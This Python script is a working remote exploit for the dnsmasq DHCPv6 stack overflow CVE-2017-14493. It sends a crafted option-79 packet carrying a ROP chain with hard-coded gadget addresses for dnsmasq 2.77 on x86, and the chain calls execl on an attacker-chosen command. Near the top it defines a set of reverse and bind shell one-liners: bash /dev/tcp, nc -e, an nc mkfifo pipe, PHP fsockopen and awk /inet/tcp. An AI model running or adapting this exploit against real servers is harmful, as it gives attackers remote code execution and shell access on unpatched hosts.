#!/usr/bin/env python

from base import Base
from argparse import ArgumentParser
from socket import socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP, SOL_SOCKET, SO_SNDBUF
from sys import exit

# NOP
NOPx86 = 0x90909090
NOPx64 = 0x9090909090909090

# ROP gadgets
# dnsmasq/2.77
POP_EAX_277x86 = 0x08081617        # pop eax; ret
POP_EBX_EBP_277x86 = 0x0804a392    # pop ebx; pop ebp; ret
MOV_EAX_EBX_277x86 = 0x080672c3    # mov [eax+0x1],ebx; add cl,cl; ret
EXECL_277x86 = 0x08070758          # execl

# Segment .data
# dnsmasq/2.77
DATA_277x86 = 0x0808c054

# Payloads
# Bind payloads
bind_port = str(4444)
bind_awk = "awk 'BEGIN{s=\"/inet/tcp/" + bind_port + \
           "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"

# Reverse payloads
reverse_port = str(4444)
reverse_host = "127.0.0.1"
reverse_awk = "awk 'BEGIN{s=\"/inet/tcp/0/" + reverse_host + "/" + reverse_port + \
              "\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
reverse_bash = "bash -i >& /dev/tcp/" + reverse_host + "/" + reverse_port + " 0>&1"
reverse_php = "php -r '$sock=fsockopen(\""+reverse_host+"\","+reverse_port+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
reverse_nc = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + reverse_host + " " + reverse_port + " >/tmp/f"
reverse_nce = "nc -e /bin/sh " + reverse_host + " " + reverse_port

Base = Base()
Base.print_banner()

parser = ArgumentParser(description='Exploit for dnsmasq CVE-2017-14493 (Stack Based overflow)')

parser.add_argument('-t', '--target', type=str, help='Set target IPv6 address', required=True)
parser.add_argument('-p', '--target_port', type=int, help='Set target port, default=547', default=547)
parser.add_argument('-c', '--capacity', help='Set capacity (x86 or x86_64), default=x86', default='x86')
parser.add_argument('-v', '--version', help='Set dnsmasq version (2.75, 2.76, 2.77), default=2.77', default='2.77')

parser.add_argument('--interpreter', type=str, help='Set path to interpreter on target, ' +
                                                    'default="/bin/bash"', default='/bin/bash')
parser.add_argument('--interpreter_arg', type=str, help='Set interpreter argument, default="-c"', default='-c')

parser.add_argument('--payload', help='Set payload (bind_awk, reverse_awk, reverse_bash, reverse_php, reverse_nc, ' +
                                      'reverse_nce), default=reverse_nc', default='reverse_nc')
parser.add_argument('--command', type=str, help='Set command for executing on target')

parser.add_argument('--bind_port', type=int, help='Set bind port, default=4444', default=4444)
parser.add_argument('--reverse_port', type=int, help='Set reverse port, default=4444', default=4444)
parser.add_argument('--reverse_host', type=str, help='Set reverse host, default="127.0.0.1"', default="127.0.0.1")

args = parser.parse_args()

host = str(args.target)
port = int(args.target_port)

capacity = ""
if args.capacity == "x86" or args.capacity == "x86_64":
    capacity = args.capacity
else:
    print Base.c_error + "Bad capacity: " + args.capacity + " allow only x86 or x86_64!"
    exit(1)

dnsmasq_version = ""
if args.version == "2.75" or args.version == "2.76" or args.version == "2.77":
    dnsmasq_version = args.version
else:
    print Base.c_error + "Bad dnsmasq version: " + args.version + " allow only 2.75, 2.76 or 2.77!"
    exit(1)

interpreter = str(args.interpreter)
interpreter_arg = str(args.interpreter_arg)

payload = ""
bind_port = str(args.bind_port)
reverse_port = str(args.reverse_port)
if args.reverse_host is not None:
    reverse_host = args.reverse_host

if args.command is not None:
    payload = args.command
else:
    if args.payload == "bind_awk": payload = bind_awk
    elif args.payload == "reverse_awk": payload = reverse_awk
    elif args.payload == "reverse_bash": payload = reverse_bash
    elif args.payload == "reverse_php": payload = reverse_php
    elif args.payload == "reverse_nc": payload = reverse_nc
    elif args.payload == "reverse_nce": payload = reverse_nce
    else:
        print Base.c_error + "Bad payload: " + args.version + " allow only bind_awk, reverse_awk, reverse_bash, " + \
              "reverse_php, reverse_nc, reverse_nce!"
        exit(1)


def send_packet(data, host, port):
    print Base.c_info + "Sending " + str(len(data)) + " bytes to " + str(host) + ":" + str(port)
    sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)

    sock.setsockopt(SOL_SOCKET, SO_SNDBUF, len(data))
    if sock.sendto(data, (host, port)) != len(data):
        print Base.c_error + "Could not send (full) payload"
    sock.close()


def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        Base.pack16(option),
        Base.pack16(length),
        data])


def add_string_in_data(addr_in_data, string):
    rop_chain = ""

    if capacity == "x86":
        if len(string) % 4 == 0:
            string = string + "\x00" * 4
        else:
            string = string + "\x00" * (4 - (len(string) % 4))

    if dnsmasq_version == "2.77":
        if capacity == "x86":
            for x in range(0, len(string), 4):
                rop_chain += Base.pack32(POP_EAX_277x86)        # pop eax; ret
                rop_chain += Base.pack32(addr_in_data - 1 + x)  # address in .data - 1
                rop_chain += Base.pack32(POP_EBX_EBP_277x86)    # pop ebx; pop ebp; ret
                rop_chain += string[x:x + 4]                    # 4 byte of string
                rop_chain += Base.pack32(DATA_277x86 + 28)      # 0x0808c054 + 28
                rop_chain += Base.pack32(MOV_EAX_EBX_277x86)    # mov [eax+0x1],ebx; add cl,cl; ret

    return rop_chain


if __name__ == '__main__':
    option_79 = ""
    if capacity == "x86" and dnsmasq_version == "2.77":
        interpreter_addr = DATA_277x86
        interpreter_arg_addr = DATA_277x86 + len(interpreter) + (4 - (len(interpreter) % 4)) + 1
        payload_addr = interpreter_arg_addr + len(interpreter_arg) + (4 - (len(interpreter_arg) % 4)) + 1

        option_79 += Base.pack16(0)  # mac_type
        option_79 += "0" * 36        # JUNK

        option_79 += Base.pack32(NOPx86)      # EBX
        option_79 += Base.pack32(NOPx86)      # ESI = ""
        option_79 += Base.pack32(NOPx86)      # EDI = ""
        option_79 += Base.pack32(0x08080DDE)  # EBP ; ret (JUNK)

        option_79 += add_string_in_data(interpreter_addr, interpreter)  # Address: 0x0808c054
        option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
        option_79 += add_string_in_data(payload_addr, payload)

        option_79 += Base.pack32(EXECL_277x86)          # execl
        option_79 += Base.pack32(interpreter_addr)      # "/bin/bash"
        option_79 += Base.pack32(interpreter_addr)      # "/bin/bash"
        option_79 += Base.pack32(interpreter_arg_addr)  # "-c"
        option_79 += Base.pack32(payload_addr)          # payload
    else:
        print Base.c_error + "This dnsmasq version: " + dnsmasq_version + " or capacity: " + capacity + \
              " not yet supported!"
        exit(1)
    
    pkg = b"".join([
        Base.pack8(12),       # DHCP6RELAYFORW
        Base.pack16(0x0313),  #
        Base.pack8(0x37),     # transaction ID
        b"_" * (34 - 4),      #
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, option_79),
    ])

    send_packet(pkg, host, int(port))
